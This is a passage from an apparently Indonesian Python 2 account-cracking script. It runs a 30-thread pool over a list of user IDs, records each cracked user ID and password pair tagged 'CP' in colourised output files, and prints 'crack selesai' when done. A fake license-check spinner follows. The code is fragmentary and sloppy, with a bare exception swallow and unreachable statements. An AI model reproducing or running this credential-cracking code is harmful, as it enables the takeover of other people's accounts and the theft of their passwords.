					cp.append(uid+' • '+asu)
					save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(' \033[1;92m[\033[1;97mCP\033[1;92m]\033[1;97m '+str(uid)+' \033[1;92m◊\033[1;97m '+str(asu)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("\n crack selesai...")
	print
	print
	exit()

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m [*] Memeriksa Lisensi ' + o,
        sys.stdout.flush()
        time.sleep(1)
        
